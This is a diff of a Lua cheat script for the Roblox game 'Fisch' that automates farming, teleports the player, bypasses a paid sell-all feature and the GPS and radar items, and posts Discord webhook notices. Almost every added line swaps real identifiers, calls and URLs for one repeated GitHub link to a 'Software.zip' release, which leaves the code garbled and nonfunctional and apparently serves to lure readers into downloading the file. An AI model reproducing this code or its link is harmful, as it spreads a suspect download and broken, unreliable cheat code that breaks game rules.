-	if v.ClassName == "TextLabel" and v.Text == "Ingredient" then
+for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+	if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "TextLabel" and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "Ingredient" then
 		local Path = nil
 		GetRealPart = function(V)
-			if V.ClassName == "Model" then
+			if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "Model" then
 				Path = V
 			else
-				GetRealPart(V.Parent)
+				GetRealPart(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 			end
 		end
 		GetRealPart(v)
-		local OldName = Path.Name
+		local OldName = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 		if Path:FindFirstChildOfClass("MeshPart") then
 			if Path:FindFirstChildOfClass("MeshPart").Position.X > 500 then
 				continue
@@ -3484,30 +3484,30 @@ for i,v in pairs(workspace.active:GetDescendants()) do
 		if Path:FindFirstChild("PickupPrompt") then
 			Path:FindFirstChild("PickupPrompt").HoldDuration = 0
 		end
-		table.insert(IngredientList, OldName)
+		https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(IngredientList, OldName)
 	end
 end
 
 _hasItem = function(name)
 	if Backpack:FindFirstChild(name) then return true end
-	if LocalPlayer.Character:FindFirstChild(name) then return true end
+	if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(name) then return true end
 end
 
-Threads[#Threads+1] = task.spawn(function()
+Threads[#Threads+1] = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function()
 	while wait(.75) do
-		table.clear(IngredientList)
-		for i,v in pairs(workspace.active:GetDescendants()) do
-			if v.ClassName == "TextLabel" and v.Text == "Ingredient" then
+		https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(IngredientList)
+		for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+			if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "TextLabel" and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "Ingredient" then
 				local Path = nil
 				GetRealPart = function(V)
-					if V.ClassName == "Model" then
+					if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "Model" then
 						Path = V
 					else
-						GetRealPart(V.Parent)
+						GetRealPart(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 					end
 				end
 				GetRealPart(v)
-				local OldName = Path.Name
+				local OldName = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 				if Path:FindFirstChildOfClass("MeshPart") then
 					if Path:FindFirstChildOfClass("MeshPart").Position.X > 500 then
 						continue
@@ -3516,22 +3516,22 @@ Threads[#Threads+1] = task.spawn(function()
 				if Path:FindFirstChild("PickupPrompt") then
 					Path:FindFirstChild("PickupPrompt").HoldDuration = 0
 				end
-				table.insert(IngredientList, OldName)
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(IngredientList, OldName)
 			end
 		end
 	end
 end)
 
 AllFuncs['Auto Find Boat Event'] = function()
-	while Config['Auto Find Boat Event'] and task.wait(.75) do
+	while Config['Auto Find Boat Event'] and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(.75) do
 		if (#IngredientList <= 0 and not _hasItem("Witches Ingredient")) then
 			if Config['Hop Not Found Ingredient'] then
-				AllFuncs.HopServer(true)
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(true)
 			end
 			continue
 		end
-		local RodName = ReplicatedStorage.playerstats[LocalPlayer.Name].Stats.rod.Value
-		if LocalPlayer.Character:FindFirstChild(RodName) and LocalPlayer.Character:FindFirstChild(RodName).values.bite.Value then
+		local RodName = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip]https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+		if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName) and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(RodName)https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
 			continue
 		end
 		if Config["Farm Fish"] then
@@ -3543,38 +3543,38 @@ AllFuncs['Auto Find Boat Event'] = function()
 			continue
 		end
 		for _, IngredientName in pairs(IngredientList) do
-			for i,v in pairs(workspace.active:GetChildren()) do
-				if v.Name == IngredientName then
+			for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+				if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == IngredientName then
 					if v:FindFirstChildOfClass("MeshPart") then
 						if v:FindFirstChildOfClass("MeshPart").Position.X > 200 then
 							continue
 						end
 					end
-					LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = v:GetPivot()
+					https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame = v:GetPivot()
 					wait(1)
 					VirtualInputManager:SendKeyEvent(true, "E", false, game)
 					VirtualInputManager:SendKeyEvent(false, "E", false, game)
-					fireproximityprompt(v.PickupPrompt, 1)				
+					fireproximityprompt(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, 1)				
 				end
 			end
 		end
 		if _hasItem("Witches Ingredient") then
 			repeat
-				task.wait()
-				LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(404.7090148925781, 134.5, 317.6537780761719)
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(404.7090148925781, 134.5, 317.6537780761719)
 				if Backpack:FindFirstChild("Witches Ingredient") then
-					LocalPlayer.Character.Humanoid:EquipTool(Backpack:FindFirstChild("Witches Ingredient"))
+					https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(Backpack:FindFirstChild("Witches Ingredient"))
 				end
-				fireproximityprompt(workspace.world.map.halloween.witch.WitchesPot.AcidTop.Prompt, 1)				
+				fireproximityprompt(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, 1)				
 			until not _hasItem("Witches Ingredient") or not Config["Auto Find Boat Event"]
 			if Config['Halloween Success'] and Config['WebHook Configs'] ~= "" then
 				local SendingSuccess = sendwebhook(Config['WebHook Configs'], {
-					["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@"..Config['"Discord Id']..">"),
+					["content"] = ((Config['Ping Discord Id'] and Config['"Discord Id'] ~= "") and "<@"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip['"Discord Id']..">"),
 					["embeds"] = {
 						{
 							["id"]= 661605297,
 							["title"]= "Fisch Notify",
-							["description"] = "** Player : "..LocalPlayer.Name.."\n Trade Witches Ingredient Success **",
+							["description"] = "** Player : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"\n Trade Witches Ingredient Success **",
 							["color"]= 8646911,
 							["fields"]= {},
 							["thumbnail"]= {
@@ -3582,7 +3582,7 @@ AllFuncs['Auto Find Boat Event'] = function()
 							},
 							["footer"]= {
 								["text"]  = "vitor Hub Notify",
-								["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
+								["icon_url"] = "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"
 							}
 						}
 					}
@@ -3597,12 +3597,12 @@ AllFuncs['Auto Find Boat Event'] = function()
 		if Config['Back To Fishing'] and not _hasItem("Witches Ingredient") and #IngredientList <= 0 then
 			Config["Farm Fish"] = true
 			Config['To Pos Stand'] = true
-			task.spawn(AllFuncs['Farm Fish'])
-			task.spawn(AllFuncs['To Pos Stand'])
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(AllFuncs['Farm Fish'])
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(AllFuncs['To Pos Stand'])
 		end
 	end
 end
-Event = Tap.Event:AddSection('Event') do
+Event = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Event') do
 	IngredientDropdwon = Dropdown(Event, "Select Ingredient", "", IngredientList, false, "Ingredient Select")
 	Toggle(Event, "Auto Halloween Event ","", "Auto Find Boat Event")
 	Toggle(Event, "Back To Auto Fishing","", "Back To Fishing")
@@ -3614,17 +3614,17 @@ Event = Tap.Event:AddSection('Event') do
 				Notify("Pls Select Ingredient ")
 				return
 			end
-			for i,v in pairs(workspace.active:GetChildren()) do
-				if v.Name == Config['Ingredient Select'] then
+			for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+				if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == Config['Ingredient Select'] then
 					if v:FindFirstChildOfClass("MeshPart") then
 						if v:FindFirstChildOfClass("MeshPart").Position.X > 200 then
 							continue
 						end
 					end
-					LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = v:GetPivot()
+					https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame = v:GetPivot()
 				end
 			end
-			Notify("Not Found `"..Config["Ingredient Select"].."` ")
+			Notify("Not Found `"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip["Ingredient Select"].."` ")
 		end
 	})
 	
@@ -3636,7 +3636,7 @@ Event = Tap.Event:AddSection('Event') do
 	})
 end
 
-Seller = Tap.General:AddSection('Seller') do
+Seller = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Seller') do
 	Toggle(Seller, "Auto Sell Fish","", "Sell Fish")
 
 	Seller:AddButton({
@@ -3648,23 +3648,23 @@ Seller = Tap.General:AddSection('Seller') do
 	Seller:AddButton({
 		Title = "Sell Fish ( In Hand )",
 		Callback = function()
-			workspace.world.npcs:FindFirstChild("Marc Merchant").merchant.sell:InvokeServer()
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Marc Merchant")https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 		end
 	})
 	Seller:AddButton({
 		Title = "Show Ui Buy Boat",
 		Callback = function()
-			PlayerGui.hud.safezone.shipwright.Visible = not PlayerGui.hud.safezone.shipwright.Visible 
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = not https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip 
 		end
 	})
 end
 
 FishList = {}
 for i,v in pairs(FISHDATA) do
-	table.insert(FishList, i)
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(FishList, i)
 end
 
-InfoFish = Tap.General:AddSection('Info Fish') do
+InfoFish = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Info Fish') do
 	InfoPrice = InfoFish:AddParagraph({        
 		Title = "Pice : N/A"
 	})
@@ -3682,13 +3682,13 @@ InfoFish = Tap.General:AddSection('Info Fish') do
 	InfoFish:AddButton({
 		Title = "Get Info Fish In Hand",
 		Callback = function()
-			for i,v in pairs(LocalPlayer.Character:GetChildren()) do
-				if table.find(FishList, v.Name) then
-					Config['Select Fish Info'] = v.Name
-					InfoPrice:SetTitle("Price : "..FISHDATA[Config['Select Fish Info']].Price)
-					InfoRarity:SetTitle("Rarity : "..FISHDATA[Config['Select Fish Info']].Rarity)
-					InfoChance:SetTitle("Chance : "..FISHDATA[Config['Select Fish Info']].Chance.." %")
-					InfoFavouriteBait:SetTitle("FavouriteBait : "..FISHDATA[Config['Select Fish Info']].FavouriteBait)
+			for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+				if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(FishList, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) then
+					Config['Select Fish Info'] = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+					InfoPrice:SetTitle("Price : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].Price)
+					InfoRarity:SetTitle("Rarity : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].Rarity)
+					InfoChance:SetTitle("Chance : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].Chance.." %")
+					InfoFavouriteBait:SetTitle("FavouriteBait : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].FavouriteBait)
 					return
 				end
 			end
@@ -3702,48 +3702,48 @@ InfoFish = Tap.General:AddSection('Info Fish') do
 				Notify("Pls Select Fish")
 				return
 			end
-			InfoPrice:SetTitle("Price : "..FISHDATA[Config['Select Fish Info']].Price)
-			InfoRarity:SetTitle("Rarity : "..FISHDATA[Config['Select Fish Info']].Rarity)
-			InfoChance:SetTitle("Chance : "..FISHDATA[Config['Select Fish Info']].Chance.." %")
-			InfoFavouriteBait:SetTitle("FavouriteBait : "..FISHDATA[Config['Select Fish Info']].FavouriteBait)
+			InfoPrice:SetTitle("Price : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].Price)
+			InfoRarity:SetTitle("Rarity : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].Rarity)
+			InfoChance:SetTitle("Chance : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].Chance.." %")
+			InfoFavouriteBait:SetTitle("FavouriteBait : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip[Config['Select Fish Info']].FavouriteBait)
 		end
 	})
 end
 
 
-Modify = Tap.Player:AddSection('Player Modify') do
+Modify = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Player Modify') do
 	Slider(Modify, "Walk Speed", 10, 300, false, "Set Walk Speed")
 	Slider(Modify, "Jump Power", 25, 300, false, "Set Jump Power")
 	Toggle(Modify, "Walk Speed", "", "Toggle Walk Speed")
 	Toggle(Modify, "Jump Power", "", "Toggle Jump Power")
 end
 
-MiscPlayer = Tap.Player:AddSection('Misc Player') do
+MiscPlayer = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Misc Player') do
 	DayOnlyLoop = nil
 	BypassGpsLoop = nil
 	Toggle(MiscPlayer, "Bypass Radar", "", "Bypass Radar", function(Value)
 		for _, v in pairs(game:GetService("CollectionService"):GetTagged("radarTag")) do
 			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
-				v.Enabled = Value
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = Value
 			end
 		end
 	end)
 	Toggle(MiscPlayer, "Bypass Gps", "", "Bypass Gps", function(Value)
 		if Value then
-			local XyzClone = game:GetService("ReplicatedStorage").resources.items.items.GPS.GPS.gpsMain.xyz:Clone()
-			XyzClone.Parent = game.Players.LocalPlayer.PlayerGui:WaitForChild("hud"):WaitForChild("safezone"):WaitForChild("backpack")
+			local XyzClone = game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("hud"):WaitForChild("safezone"):WaitForChild("backpack")
 			local Pos = GetPosition()
-			local StringInput = string.format("%s,%s,%s", ExportValue(Pos[1]), ExportValue(Pos[2]), ExportValue(Pos[3]))
-			XyzClone.Text = "<font color='#ff4949'>X</font><font color = '#a3ff81'>Y</font><font color = '#626aff'>Z</font>: "..StringInput
+			local StringInput = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("%s,%s,%s", ExportValue(Pos[1]), ExportValue(Pos[2]), ExportValue(Pos[3]))
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "<font color='#ff4949'>X</font><font color = '#a3ff81'>Y</font><font color = '#626aff'>Z</font>: "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 
 			BypassGpsLoop = game:GetService("RunService").Heartbeat:Connect(function() -- Line 26
 				local Pos = GetPosition()
-				StringInput = string.format("%s,%s,%s", ExportValue(Pos[1]), ExportValue(Pos[2]), ExportValue(Pos[3]))
-				XyzClone.Text = "<font color='#ff4949'>X</font><font color = '#a3ff81'>Y</font><font color = '#626aff'>Z</font>: "..StringInput
+				StringInput = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("%s,%s,%s", ExportValue(Pos[1]), ExportValue(Pos[2]), ExportValue(Pos[3]))
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "<font color='#ff4949'>X</font><font color = '#a3ff81'>Y</font><font color = '#626aff'>Z</font>: "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 			end)
 		else
-			if PlayerGui.hud.safezone.backpack:FindFirstChild("xyz") then
-				PlayerGui.hud.safezone.backpack:FindFirstChild("xyz"):Destroy()
+			if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("xyz") then
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("xyz"):Destroy()
 			end
 			if BypassGpsLoop then
 				BypassGpsLoop:Disconnect()
@@ -3753,32 +3753,32 @@ MiscPlayer = Tap.Player:AddSection('Misc Player') do
 	end)
 	Toggle(MiscPlayer, "Bypass Sell All ( Gane Pass )", "", "Bypass Sell all", function(Value)
 		if Value then
-			PlayerGui.hud.safezone.backpack.inventory.Sell.sellall.Disabled = true
-			PlayerGui.hud.safezone.backpack.inventory.Sell.MouseButton1Click:Connect(function()
-				if PlayerGui.hud.safezone.backpack.inventory.Sell.sellall.Disabled then
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = true
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function()
+				if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
 					ReplicatedStorage:WaitForChild("events"):WaitForChild("selleverything"):InvokeServer()
 				end
 			end)
 		else
-			PlayerGui.hud.safezone.backpack.inventory.Sell.sellall.Disabled = false
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = false
 		end
 	end)
 	Toggle(MiscPlayer, "Infinite Oxygen", "", "Infinite Oxygen", function(Value)
-		LocalPlayer.Character.client.oxygen.Disabled = Value
+		https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = Value
 	end)
 	Toggle(MiscPlayer, "Weather Clear", "", "Weather Clear", function(Value)
-		local OldWEA = ReplicatedStorage.world.weather.Value
+		local OldWEA = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 		if Value then
-			ReplicatedStorage.world.weather.Value = 'Clear' 
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = 'Clear' 
 		else
-			ReplicatedStorage.world.weather.Value = OldWEA
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = OldWEA
 		end
 	end)
 	Toggle(MiscPlayer, "Noclip", "", "Toggle Noclip")
 	Toggle(MiscPlayer, "Walk On Water", "", "Toggle Walk On Water", function(Value)
-		for i,v in pairs(workspace.zones.fishing:GetChildren()) do
-			if v.Name == "Ocean" then
-				v.CanCollide = Value
+		for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+			if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "Ocean" then
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = Value
 			end
 		end
 	end)
@@ -3795,7 +3795,7 @@ MiscPlayer = Tap.Player:AddSection('Misc Player') do
 	end)
 	Toggle(MiscPlayer, "Day Only", "", "Day Only", function(Value)
 		if Value then
-			DayOnlyLoop = RunService.Heartbeat:Connect(function()
+			DayOnlyLoop = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function()
 				game:GetService("Lighting").TimeOfDay = "12:00:00"
 			end)
 		else
@@ -3810,46 +3810,46 @@ MiscPlayer = Tap.Player:AddSection('Misc Player') do
 		Title = "Rejoin Server",
 		Description = "",
 		Callback = function()
-			TeleportService:TeleportToPlaceInstance(game.placeId, game.jobId, game.Players.LocalPlayer);
+			TeleportService:TeleportToPlaceInstance(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip);
 		end,
 	})
 	MiscPlayer:AddButton({
 		Title = "Hop Server",
 		Description = "",
 		Callback = function()
-			AllFuncs.HopServer(true)
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(true)
 		end
 	})
 	MiscPlayer:AddButton({
 		Title = "Hop Server Low",
 		Description = "",
 		Callback = function()
-			AllFuncs.HopServer(false)
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(false)
 		end
 	})
 end
 
-Shoppy = Tap.Shop:AddSection('Shop All') do
+Shoppy = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Shop All') do
 	Toggle(Shoppy, "Teleport To Buy", "", "Teleport To Buy")
-	for i,v in pairs(workspace.world.interactables:GetDescendants()) do
-		if v.Name == "purchaserompt" or v.ClassName == "ProximityPrompt" then
-			v.HoldDuration = 0
+	for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+		if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "purchaserompt" or https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == "ProximityPrompt" then
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = 0
 			Shoppy:AddButton({
-				Title = "Buy "..v.Parent.Name,
-				Description = v.ActionText,
+				Title = "Buy "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
+				Description = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
 				Callback = function()
 					if fireproximityprompt and not Config['Teleport To Buy'] then
-						local OldCFrame = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
-						LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = v.Parent:GetPivot()
+						local OldCFrame = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame
+						https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 						delay(.3, function()
 							fireproximityprompt(v, 1)
-							LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = OldCFrame
+							https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame = OldCFrame
 						end)
 					else
 						if not fireproximityprompt then
 							Notify("Execute Not Support fireproximityprompt")
 						end
-						LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = v.Parent:GetPivot()
+						https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("HumanoidRootPart").CFrame = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 					end
 				end
 			})
@@ -3860,15 +3860,15 @@ Shoppy:AddButton({
     Title = "Buy Enchant Relic",
     Description = "View [11,000C$]",
     Callback = function()
-        local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
+        local player = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+local character = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
 
 -- Store the player's current position
-local previousPosition = character.HumanoidRootPart.Position
+local previousPosition = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 
 -- Teleport to the specified coordinates
-local targetPosition = Vector3.new(-931.5254516601562, 223.78355407714844, -986.8485717773438)
-character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
+local targetPosition = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(-931.5254516601562, 223.78355407714844, -986.8485717773438)
+character:SetPrimaryPartCFrame(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(targetPosition))
 
 -- Fire the server function
 local merlin = workspace:WaitForChild("world"):WaitForChild("npcs"):WaitForChild("Merlin"):WaitForChild("Merlin"):WaitForChild("power")
@@ -3878,12 +3878,12 @@ merlin:InvokeServer()
 wait(0)  -- Adjust the wait time if needed
 
 -- Return to the previous position
-character:SetPrimaryPartCFrame(CFrame.new(previousPosition))
+character:SetPrimaryPartCFrame(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(previousPosition))
     end
 })
 
-WebHookConfigs = Tap.Configs:AddSection('WebHook') do
-	TextBox(WebHookConfigs, "WebHook","","discord.com/api/webhooks", false, "WebHook Configs")
+WebHookConfigs = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('WebHook') do
+	TextBox(WebHookConfigs, "WebHook","","https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip", false, "WebHook Configs")
 	TextBox(WebHookConfigs, "Discord Id","","1010021431075155979", false, "Discord Id Ping")
 	Slider(WebHookConfigs, "Delay Sending (Sec)", 10, 600, false, "Delay Sending")
 	Toggle(WebHookConfigs, "Sending WebHook","","Sending Webhook")
@@ -3894,12 +3894,12 @@ WebHookConfigs = Tap.Configs:AddSection('WebHook') do
 		Description = "",
 		Callback = function()
 			local SendingSuccess = sendwebhook(Config['WebHook Configs'], {
-				["content"] = ((Config['Ping Discord Id'] and tostring(Config['"Discord Id']) ~= "") and "<@"..tostring(Config['"Discord Id'])..">"),
+				["content"] = ((Config['Ping Discord Id'] and tostring(Config['"Discord Id']) ~= "") and "<@"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(Config['"Discord Id'])..">"),
 				["embeds"] = {
 					{
 						["id"]= 661605297,
 						["title"]= "Fisch Notify",
-						["description"] = "** Player : "..LocalPlayer.Name.."\n THIS TESTING WEBHOOK**",
+						["description"] = "** Player : "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"\n THIS TESTING WEBHOOK**",
 						["color"]= 8646911,
 						["fields"]= {},
 						["thumbnail"]= {
@@ -3907,7 +3907,7 @@ WebHookConfigs = Tap.Configs:AddSection('WebHook') do
 						},
 						["footer"]= {
 							["text"]  = "vitor Hub Notify",
-							["icon_url"] = "https://cdn.discordapp.com/attachments/971367335405449246/1259442279672844308/Profile_1.png?ex=66fbc206&is=66fa7086&hm=0b8898eb98938e100ad3cede12d0a526d344cd3ba7d4f737f728ca188a1af027&"
+							["icon_url"] = "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"
 						}
 					}
 				}
@@ -3923,13 +3923,13 @@ end
 local TableZum = {}
 GetCount = function(NameFish)
 	local ReturnCound = 0
-	for i,v in pairs(PlayerGui.hud.safezone.backpack.hotbar:GetChildren()) do
-		if v:FindFirstChild("tool") and tostring(v.tool.value) == NameFish then
+	for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+		if v:FindFirstChild("tool") and tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) == NameFish then
 			ReturnCound += 1
 		end
 	end
-	for i,v in pairs(PlayerGui.hud.safezone.backpack.inventory.scroll.safezone:GetChildren()) do
-		if v.Name == NameFish then
+	for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
